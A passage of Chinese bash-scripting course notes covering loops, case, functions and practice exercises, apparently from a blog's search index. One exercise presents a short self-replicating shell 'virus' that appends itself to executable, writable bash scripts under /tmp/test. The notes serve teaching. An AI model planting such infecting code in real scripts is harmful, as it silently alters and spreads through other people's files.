59</span><br><span class="line">hello postfix,your uid is 89</span><br><span class="line">hello sshd,your uid is 74</span><br><span class="line">hello student,your uid is 1000</span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for2.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `ls /var/`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> hello <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> /var目录中一共有`ls -l /var/|wc -l`个文件</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for2.sh</span></span><br><span class="line">hello adm</span><br><span class="line">hello cache</span><br><span class="line">hello crash</span><br><span class="line">hello db</span><br><span class="line">hello empty</span><br><span class="line">hello games</span><br><span class="line">hello gopher</span><br><span class="line">hello kerberos</span><br><span class="line">hello lib</span><br><span class="line">hello <span class="built_in">local</span></span><br><span class="line">hello lock</span><br><span class="line">hello <span class="built_in">log</span></span><br><span class="line">hello mail</span><br><span class="line">hello nis</span><br><span class="line">hello opt</span><br><span class="line">hello preserve</span><br><span class="line">hello run</span><br><span class="line">hello spool</span><br><span class="line">hello tmp</span><br><span class="line">hello yp</span><br><span class="line">/var目录中一共有21个文件</span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for3.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请输入用户名："</span> username</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请输入文件SIZE的最大值："</span> size</span><br><span class="line"></span><br><span class="line">find / -user <span class="variable">$username</span> -size +<span class="variable">$size</span> 2&gt;/dev/null</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for3.sh</span></span><br><span class="line">请输入用户名：root</span><br><span class="line">请输入文件SIZE的最大值：500M</span><br><span class="line">/proc/kcore</span><br><span class="line">[root@client47 ~]<span class="comment"># bash for3.sh</span></span><br><span class="line">请输入用户名：root</span><br><span class="line">请输入文件SIZE的最大值：100M</span><br><span class="line">/proc/kcore</span><br><span class="line">/usr/lib/locale/locale-archive</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client47 ~]<span class="comment"># cat for4.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"plz input CMD:"</span> cmd</span><br><span class="line">start=`date +%s`</span><br><span class="line"><span class="variable">$cmd</span> &amp;&gt; /dev/null</span><br><span class="line">end=`date +%s`</span><br><span class="line">time=$((<span class="variable">$end</span>-<span class="variable">$start</span>))</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cmd</span> 执行的时间为 <span class="variable">$time</span></span><br><span class="line">[root@client47 ~]<span class="comment"># bash for4.sh</span></span><br><span class="line">plz input CMD:xz -d /tmp/big.xz</span><br><span class="line">xz -d /tmp/big.xz 执行的时间为 2</span><br></pre></td></tr></table></figure>
+
+<h4 id="拓展题"><a href="#拓展题" class="headerlink" title="拓展题"></a>拓展题</h4><ol>
+<li>画斜线正反<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">*</span><br><span class="line"> *</span><br><span class="line">  *</span><br><span class="line">   *</span><br></pre></td></tr></table></figure></li>
+<li>写一个9*9乘法表</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat x1.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#行数	空格	*数量</span></span><br><span class="line"><span class="comment">#1 	0 	1</span></span><br><span class="line"><span class="comment">#2	1	1</span></span><br><span class="line"><span class="comment">#3	2	1</span></span><br><span class="line"><span class="comment">#n	n-1	1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 <span class="variable">$1</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> `seq 1 $((<span class="variable">$i</span>-1))`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		<span class="built_in">echo</span> -n <span class="string">' '</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">	<span class="built_in">echo</span>  <span class="string">'*'</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash x1.sh 4</span></span><br><span class="line">*</span><br><span class="line"> *</span><br><span class="line">  *</span><br><span class="line">   *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># cat x2.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#1*1=1</span></span><br><span class="line"><span class="comment">#2*1=2	2*2=4</span></span><br><span class="line"><span class="comment">#3*1=3	3*2	3*3</span></span><br><span class="line"><span class="comment">#9*1	9*2				9*9=</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 9`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> `seq 1 <span class="variable">$i</span>`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		<span class="built_in">echo</span> -n <span class="string">"<span class="variable">$i</span>*<span class="variable">$j</span>=<span class="variable">$(($i*$j)</span>) "</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">	<span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash x2.sh</span></span><br><span class="line">1*1=1</span><br><span class="line">2*1=2 2*2=4</span><br><span class="line">3*1=3 3*2=6 3*3=9</span><br><span class="line">4*1=4 4*2=8 4*3=12 4*4=16</span><br><span class="line">5*1=5 5*2=10 5*3=15 5*4=20 5*5=25</span><br><span class="line">6*1=6 6*2=12 6*3=18 6*4=24 6*5=30 6*6=36</span><br><span class="line">7*1=7 7*2=14 7*3=21 7*4=28 7*5=35 7*6=42 7*7=49</span><br><span class="line">8*1=8 8*2=16 8*3=24 8*4=32 8*5=40 8*6=48 8*7=56 8*8=64</span><br><span class="line">9*1=9 9*2=18 9*3=27 9*4=36 9*5=45 9*6=54 9*7=63 9*8=72 9*9=81</span><br></pre></td></tr></table></figure>
+
+<h3 id="while-语法格式"><a href="#while-语法格式" class="headerlink" title="while 语法格式"></a>while 语法格式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">	while condition 指的是判断的条件</span><br><span class="line">	do</span><br><span class="line">		CMD</span><br><span class="line">	done</span><br><span class="line">数字的判断 	字符的判断 	文件的判断</span><br><span class="line">	-gt 大于 	-z 空 		-d 文件是不是一个目录</span><br><span class="line">	-ge 大于等于 	=  字符相等 	-f 是不是一个普通文件</span><br><span class="line">	-lt 小于 	!= 字符不相等 	-e 文件是不是存在</span><br><span class="line">	-le 小于等于 	-n 非空 	</span><br><span class="line">	-ne 不等于 	-a 逻辑与</span><br><span class="line">	-eq 等于 	-o 逻辑或</span><br></pre></td></tr></table></figure>
+
+
+<ol>
+<li>当什么的时候就做什么,体验无限循环<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">touch /tmp/whilefile</span><br><span class="line">while [ -f /tmp/whilefile ]</span><br><span class="line">do</span><br><span class="line">	cat &gt;&gt; /tmp/whilefile &lt;&lt; ENDF</span><br><span class="line">当山峰没有棱角的时候</span><br><span class="line">当河水不再流</span><br><span class="line">。。。</span><br><span class="line">我哈哈ishi</span><br><span class="line">ENDF</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure></li>
+<li>不满足条件跳出循环<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">判断/tmp/whilefile2是否存在，不存在的时候我们去创建</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while [ ! -e /tmp/whilefile2 ]</span><br><span class="line">do</span><br><span class="line">	cat &gt; /tmp/whilefile2 &lt;&lt; ENDF</span><br><span class="line">hello</span><br><span class="line">ENDF</span><br><span class="line"></span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<h3 id="until-语法格式"><a href="#until-语法格式" class="headerlink" title="until 语法格式"></a>until 语法格式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">until condition --&gt; 不满足 condition, 则执行 cmd</span><br><span class="line">do</span><br><span class="line">	CMD</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<h4 id="课堂练习-2"><a href="#课堂练习-2" class="headerlink" title="课堂练习"></a>课堂练习</h4><pre><code>1. 连乘算法 while和until
+2. 要求根据userlist创建用户，要求指定用户名，用户id，用户的附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。
+userlist文件的格式如下：
+carol 777 tom uplooking
+natasha 778 tom uplooking
+r1 779 tom uplooking
+3. 要求根据userlist创建用户，要求指定用户名，用户id，用户的默认组和附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。
+[root@rhel6 ~]# cat /tmp/useraddlist1
+dabao 888 xuexi,it uplooking
+lucy 889 sales,it uplooking
+lily 899 pro,aa uplooking</code></pre><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat useradd.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> a</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	A=(<span class="variable">$a</span>)</span><br><span class="line">	groupadd <span class="variable">$&#123;A[2]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">	useradd -u <span class="variable">$&#123;A[1]&#125;</span> -G <span class="variable">$&#123;A[2]&#125;</span> <span class="variable">$&#123;A[0]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$&#123;A[3]&#125;</span>|passwd --stdin <span class="variable">$&#123;A[0]&#125;</span> &amp;&gt; /dev/null</span><br><span class="line">	id <span class="variable">$&#123;A[0]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span>&lt;/root/userlist</span><br><span class="line"></span><br><span class="line">[root@client0 ~]<span class="comment"># bash useradd.sh</span></span><br><span class="line">uid=777(carol) gid=1001(carol) groups=1001(carol),1000(tom)</span><br><span class="line">uid=778(natasha) gid=1002(natasha) groups=1002(natasha),1000(tom)</span><br><span class="line">uid=779(r1) gid=1003(r1) groups=1003(r1),1000(tom)</span><br></pre></td></tr></table></figure>
+
+<h3 id="晚自习作业"><a href="#晚自习作业" class="headerlink" title="晚自习作业"></a>晚自习作业</h3><ol>
+<li>完成今天课上的所有练习题目</li>
+<li>石子游戏：有n石子，谁拿到最后一个石子谁赢，<br>用户可以指定一共由多少个石子，每次最多可以拿的石子数是可以给用户指定的</li>
+<li>创建一个以今天日期为名的目录20160811;<br>将/目录下所有以.sh结尾的文件复制到新创建的目录中；<br>将该目录打包压缩存到/tmp目录下保存。</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat game</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"游戏开始！请玩家指定石子的个数:"</span> n1</span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"请玩家指定每次取石子的最多个数:"</span> n2</span><br><span class="line"></span><br><span class="line">k=$((<span class="variable">$n1</span>%(<span class="variable">$n2</span>+1)))</span><br><span class="line">j=$((<span class="variable">$n1</span>/(<span class="variable">$n2</span>+1)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">HH</span></span> () &#123;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 <span class="variable">$j</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">read</span> -p <span class="string">"请玩家取石子:"</span> w</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"我取 <span class="variable">$((($n2+1)</span>-<span class="variable">$w</span>)) 个石子"</span></span><br><span class="line">	q=$((<span class="variable">$q</span>-(<span class="variable">$n2</span>+1)))</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"目前还剩下 <span class="variable">$q</span> 个石子"</span></span><br><span class="line">	[ <span class="variable">$q</span> -eq 0 ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"你输了@.@!"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$k</span> -gt 0 ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"我先取 <span class="variable">$k</span> 个石子"</span></span><br><span class="line">	q=$((<span class="variable">$n1</span>-<span class="variable">$k</span>))</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"目前还剩下 <span class="variable">$q</span> 个石子"</span></span><br><span class="line">	HH</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	q=<span class="variable">$n1</span></span><br><span class="line">	HH</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="case-语法格式"><a href="#case-语法格式" class="headerlink" title="case 语法格式"></a>case 语法格式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">case 取值 in</span><br><span class="line">取值 1)</span><br><span class="line">	CMD1 ;</span><br><span class="line">	cmd11;</span><br><span class="line">	cmd12;;</span><br><span class="line">取值 2)</span><br><span class="line">	CMD2 ;;</span><br><span class="line">取值 3)</span><br><span class="line">	CMD3 ;;</span><br><span class="line">*)</span><br><span class="line">	CMD4 ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
+<p>* 代表除了以上所有的取值 , 做某一些操作</p>
+<h4 id="课堂练习-3"><a href="#课堂练习-3" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol>
+<li>请问你是否喜欢shell脚本？ 如果你回答yes，则程序退出，否则永远会问你是否喜欢shell脚本？</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]# cat 1.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">read -p "请问你是否喜欢shell脚本？" an</span><br><span class="line">until [ $an = yes ]</span><br><span class="line">do</span><br><span class="line">case $an in</span><br><span class="line">yes)</span><br><span class="line">	exit;;</span><br><span class="line">*)</span><br><span class="line">	read -p "请问你是否喜欢shell脚本？" an;;</span><br><span class="line"></span><br><span class="line">esac</span><br><span class="line">done</span><br><span class="line">[root@client0 ~]# bash 1.sh</span><br><span class="line">请问你是否喜欢shell脚本？yes</span><br><span class="line">[root@client0 ~]# bash 1.sh</span><br><span class="line">请问你是否喜欢shell脚本？no</span><br><span class="line">请问你是否喜欢shell脚本？lsdjflksd</span><br><span class="line">请问你是否喜欢shell脚本？lsdjflksd</span><br><span class="line">请问你是否喜欢shell脚本？iii</span><br><span class="line">请问你是否喜欢shell脚本？fuck you</span><br><span class="line">1.sh: line 4: [: too many arguments</span><br><span class="line">请问你是否喜欢shell脚本？...</span><br><span class="line">请问你是否喜欢shell脚本？^^^[[D</span><br><span class="line">请问你是否喜欢shell脚本？yes</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="continue-语法格式"><a href="#continue-语法格式" class="headerlink" title="continue 语法格式"></a>continue 语法格式</h3><pre><code>continue 作用于循环语句中 代表跳出这个循环进入下个循环 .</code></pre><h4 id="课堂练习-4"><a href="#课堂练习-4" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol start="2">
+<li>要求输出100以下所有能够被7整除，但不能够被5整除的数字。（并在一行输出）</li>
+</ol>
+<h3 id="break-语法格式"><a href="#break-语法格式" class="headerlink" title="break 语法格式"></a>break 语法格式</h3><pre><code>break 作用于循环语句中 代表直接跳出该循环 .</code></pre><h4 id="课堂练习-5"><a href="#课堂练习-5" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol start="3">
+<li>要求找出系统中属于student用户的一个文件.</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat file.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `find / -user student 2&gt;/dev/null`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">	<span class="built_in">break</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="shift-语法格式"><a href="#shift-语法格式" class="headerlink" title="shift 语法格式"></a>shift 语法格式</h3><pre><code>位置参数</code></pre><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">   $</span><span class="bash">1 代表的是输入的第一个参数</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 代表的是输入的第二个参数 ....</span></span><br><span class="line"><span class="meta">$</span><span class="bash">0 代表的是 bash 程序本身名</span></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="comment"># 代表的是参数的个数</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;10&#125; 超过的两位的</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;*&#125;或者<span class="variable">$&#123;@&#125;</span> 代表将所有位置参数</span></span><br><span class="line">shift 代表移走第一位位置参数 , 由后续的位置参数前移一位 .</span><br></pre></td></tr></table></figure>
+<h4 id="课堂练习-6"><a href="#课堂练习-6" class="headerlink" title="课堂练习"></a>课堂练习</h4><ol start="4">
+<li>显示位置参数的值，以及可执行脚本名称，参数的总数</li>
+</ol>
+<h3 id="function-语法格式"><a href="#function-语法格式" class="headerlink" title="function 语法格式"></a>function 语法格式</h3><pre><code>functname ()
+{
+shell commands
+}</code></pre><ul>
+<li><p>函数的调用</p>
+<ol>
+<li>直接调用函数– 函数名</li>
+<li>传入参数– 函数名 参数1 参数2 参数3</li>
+<li>使用return返回函数结束状态</li>
+</ol>
+</li>
+<li><p>函数中的局部变量和全局变量</p>
+</li>
+</ul>
+<p>默认为全局变量，因此不同的函数不可以使用同一个变量；<br>如果要变成局部变量，需要使用local来修饰，那么不同的函数就不能访问到这个局部变量。</p>
+<ul>
+<li>函数返回值 return<br>可以使用return命令来设置返回值；</li>
+</ul>
+<p>例如 return 0</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#### 课堂练习</span></span><br><span class="line"></span><br><span class="line">5. 创建一个命令booboo，命令用法如下：</span><br><span class="line">booboo -t 30s 	代表睡30s；即-t后跟时间</span><br><span class="line">booboo -l /tmp  代表显示某个目录下面的内容和属性以及目录本身的属性</span><br><span class="line">booboo -r /tmp/file 代表删除某个文件</span><br><span class="line">booboo --<span class="built_in">help</span>	代表帮助信息显示该命令的用法</span><br><span class="line"></span><br><span class="line">6. 输入你的出生日期，程序会告诉你距离你下一个生日还有几天？</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat booboo</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">SLEEP ()</span><br><span class="line">&#123;</span><br><span class="line">	sleep <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DIR ()</span><br><span class="line">&#123;</span><br><span class="line">	ls -l <span class="variable">$1</span></span><br><span class="line">	ls -ld <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RM ()</span><br><span class="line">&#123;</span><br><span class="line">	rm -rf <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">-t)</span><br><span class="line">	SLEEP <span class="variable">$2</span>;;</span><br><span class="line">-l)</span><br><span class="line">	DIR <span class="variable">$2</span>;;</span><br><span class="line">-r)</span><br><span class="line">	RM <span class="variable">$2</span>;;</span><br><span class="line">--<span class="built_in">help</span>)</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"Usage: ls [-t|-l|-r|--help] [values]"</span>;;</span><br><span class="line">*)</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">"Usage: ls [-t|-l|-r|--help] [values]"</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line">[root@client0 ~]<span class="comment"># ./booboo -t 3s</span></span><br></pre></td></tr></table></figure>
+<hr>
+<p>使用bash写一个脚本实现以下功能：</p>
+<p>1) -r 查看系统发行版本<br>2) -k 查看系统内核版本<br>3) -d 查看系统磁盘信息<br>4) -u 查看当前系统用户<br>5) -t 查看系统运行时间<br>6) -s 查看selinux状态<br>7) -f 查看内存信息<br>8) -n 查看网络信息<br>9) -a 实现以上所有功能<br>10）–help 查看帮助</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">REL () &#123;</span><br><span class="line">cat /etc/redhat-release	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">KER () &#123;</span><br><span class="line">uname -a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DIS () &#123;</span><br><span class="line">df -h</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">USR () &#123;</span><br><span class="line">who</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">UPT () &#123;</span><br><span class="line">uptime</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SEL () &#123;</span><br><span class="line">getenforce</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FER () &#123;</span><br><span class="line">free -m</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NET () &#123;</span><br><span class="line">ifconfig</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">-r)</span><br><span class="line">	REL;;	</span><br><span class="line">-k)</span><br><span class="line">	KER;;</span><br><span class="line">-d)</span><br><span class="line">	DIS;;</span><br><span class="line">-u)</span><br><span class="line">	USR;;</span><br><span class="line">-t)</span><br><span class="line">	UPT;;</span><br><span class="line">-s)</span><br><span class="line">	SEL;;</span><br><span class="line">-f)	</span><br><span class="line">	FER;;</span><br><span class="line">-n)</span><br><span class="line">	NET;;</span><br><span class="line">-a)</span><br><span class="line">	REL;KER;DIS;USR;UPT;SEL;FER;NET;;</span><br><span class="line">--help)</span><br><span class="line">	echo "this is help"</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
+<hr>
+<p>用shell脚本写一个病毒，要求如下：</p>
+<ol>
+<li>可以感染系统中的所有Bourne-Again shell script的脚本,可执行，可写；</li>
+<li>执行感染后的bash shell脚本会输出”echo hello,I am evil!”</li>
+<li>如果已经被感染，就不再感染</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [ ! -f /tmp/.mybblock ];then touch /tmp/.mybblock; for i in `find /tmp/test/*` ; do grep "mybblock" $i &amp;&gt; /dev/null &amp;&amp; continue ; file $i | grep "Bourne-Again shell script" &amp;&gt; /dev/null || continue ; [ -x $i -a -w $i ] || continue ; tail -n 1 $0 &gt;&gt; $i; done ; echo "hello,I am evil!"; rm -rf /tmp/.mybblock &amp;&gt; /dev/null ; fi</span><br></pre></td></tr></table></figure>
+<hr>
+<p>如果foo.sh 的第一个位置参数为-s ，那么就沉睡，时间由第二个位置参数决定</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">SLEEP ()</span><br><span class="line">&#123;</span><br><span class="line">        echo "now sleep"</span><br><span class="line">        sleep $1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">-s)</span><br><span class="line">        SLEEP $2;;</span><br><span class="line">*)</span><br><span class="line">        exit;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>技术培训</category>
+        <category>LinuxBash脚本教程</category>
+      </categories>
+      <tags>
+        <tag>培训</tag>
+        <tag>LinuxBash脚本</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LINUX Shell Scripts 第三课:正则表达式</title>
+    <url>/2016/12/23/booboo_bash_shell_scripts/02_shell_regular_expression/</url>
+    <content><![CDATA[<p>Regular Expression 、 regex 或 regexp, 缩写为 RE 正则表达式这个概念最初是由 Unix 中的工具软件 ( 例如 sed 和 grep) 普及开的。</p>
+<p>通常被用来检索、替换那些符合某个规则的文本。</p>
+<p>许多程序设计语言都支持正则表达是进行字符串操作。例如，在perl中就内建了一个功能强大的正则表达式引擎，还有java语言自带的。</p>
+<p>起源于科学家对人类神经系统工作原理的早期研究；Ken Thompson将其应用到计算搜索算法 ，Unix之父将此引入到编辑器QED，后来的ed，最终引入grep。</p>
+<p>概念：</p>
+<p>正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、以及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。</p>
+<h3 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式"></a>什么是正则表达式</h3><ul>
+<li>正则表达式就是记录文本规则的代码</li>
+<li>和通配符类似,正则表达式也是用来进行文本匹配的工具,只不过比起通配符,它能更精确地描述你的需求</li>
+</ul>
+<p>字符和字符串：</p>
+<ul>
+<li>字符是计算机软件处理文字时最基本的单位,可能是字母,数字,标点符号,空格,换行符,汉字等等</li>
+<li>字符串是0个或更多个字符的序列。</li>
+</ul>
+<p>特点：</p>
+<ol>
+<li>灵活性、逻辑性和功能性非常强；</li>
+<li>可以迅速地用极简单的方式达到字符串的复杂控制；</li>
+<li>对于刚接触的人来说，比较晦涩难懂。</li>
+</ol>
+<p>应用程序：<br>grep,egrep,awk,mysql,vim</p>
+<h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">特殊字符 	代表意义</span><br><span class="line">[:alnum:] 代表英文大小写字符及数字 ,0-9, A-Z, a-z</span><br><span class="line">[:alpha:] 代表任何英文大小写字符 , A-Z, a-z</span><br><span class="line">[:lower:] 代表小写字符 , a-z</span><br><span class="line">[:upper:] 代表大写字符 ,A-Z</span><br><span class="line">[:digit:] 代表数字而已 , 0-9</span><br><span class="line">[:xdigit:] 代表 16 进制数字 , 因此包括 : 0-9, A-F, a-f</span><br><span class="line">[:blank:] 代表空格键和 [Tab] 按键</span><br><span class="line">[:space:] 任何会产生空白的字符,包括空格键 , [Tab], CR 等等</span><br><span class="line">[:graph:] 除了空格键 ( 空格键和 [Tab] ) 外的其他所有按键</span><br><span class="line">[:cntrl:] 代表键盘上面的控制按键 , 包括 CR, LF, Tab, Del.. 等等</span><br><span class="line">[:print:] 代表任何可以被打印出来的字符</span><br><span class="line">[:punct:] 代表标点符号 (punctuation symbol) :&quot; &#39; ? ! ; : # $...</span><br></pre></td></tr></table></figure>
+<h3 id="非打印字符"><a href="#非打印字符" class="headerlink" title="非打印字符"></a>非打印字符</h3><p>非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符 	描述</span><br><span class="line">\cx 	匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 &#39;c&#39; 字符。</span><br><span class="line">\f 	匹配一个换页符。等价于 \x0c 和 \cL。</span><br><span class="line">\n 	匹配一个换行符。等价于 \x0a 和 \cJ。</span><br><span class="line">\r 	匹配一个回车符。等价于 \x0d 和 \cM。</span><br><span class="line">\s 	匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。</span><br><span class="line">\S 	匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。</span><br><span class="line">\t 	匹配一个制表符。等价于 \x09 和 \cI。</span><br><span class="line">\v 	匹配一个垂直制表符。等价于 \x0b 和 \cK</span><br></pre></td></tr></table></figure>
+<h3 id="常见的正则表达式"><a href="#常见的正则表达式" class="headerlink" title="常见的正则表达式"></a>常见的正则表达式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^ 	行首定位符</span><br><span class="line">$ 	行尾定位符</span><br><span class="line">. 	匹配除换行符之外的单个字符</span><br><span class="line">* 	匹配 0 个或多个前一字符</span><br><span class="line">? 	匹配 0 个或1个前一字符</span><br><span class="line">+	匹配 1 个或多个前一个字符</span><br><span class="line">[ ] 	匹配指定字符组内的任一字符</span><br><span class="line">[^] 	匹配不在指定字符组内的任一字符</span><br><span class="line">\&lt; 	单词起始边界匹配符</span><br><span class="line">\&gt; 	单词结束边界匹配符</span><br><span class="line">x\&#123;m\&#125;	连续 M 个字符 X</span><br><span class="line">x\&#123;m,\&#125; 至少 M 个字符 X</span><br><span class="line">x\&#123;m,n\&#125;至少 M 个最多 N 个字符 X</span><br></pre></td></tr></table></figure>
+
+<h3 id="课堂练习"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习</h3><blockquote>
+<p>写一个测试脚本re.sh;带位置参数执行，例如 re.sh ab</p>
+</blockquote>
